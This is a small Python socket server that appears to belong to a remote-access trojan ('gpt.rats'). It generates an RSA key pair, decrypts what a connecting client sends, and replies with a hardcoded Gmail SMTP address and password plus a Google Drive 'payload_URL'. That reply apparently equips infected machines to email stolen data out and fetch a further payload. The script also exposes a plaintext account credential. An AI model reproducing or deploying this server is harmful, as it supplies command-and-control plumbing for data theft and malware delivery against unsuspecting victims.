from utils import *

# old ip
# SERVER_IP = '172.20.10.2'
SERVER_IP = '127.0.0.1'
SERVER_PORT = 5678

exported_public_key, exported_private_key = generateRSAKeys()
key_pair = exported_public_key.decode().replace("\n", "") + "\n" + exported_private_key.decode().replace("\n", "")
saveKey(key_pair, "keyPair.key")

with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    
    s.bind((SERVER_IP, SERVER_PORT))
    print('Server is listening')
    s.listen(1)
    conn,addr = s.accept()
    print(f'Connection accepted from :{addr}')
    with conn:
        while(True):
            conn.send(exported_public_key)
            encrypted_ascii =  conn.recv(1024)
            print(encrypted_ascii)
            decrypted_ascii = decrypt_with_RSA(encrypted_ascii, exported_private_key)
            print(decrypted_ascii)
            credentials = {}
            credentials['smtp_email'] = "gpt.rats@gmail.com"
            credentials['smtp_password'] = "mmtxdnfzzvckqrhw"
            payload_URL = "https://drive.google.com/file/d/1VvtvtlRVoRSaGe0riYtA9dZJKeXwHwDk/view?usp=sharing"
            conn.send(credentials['smtp_email'].encode() + b"\n" + credentials['smtp_password'].encode() + b"\n" + payload_URL.encode())
            break


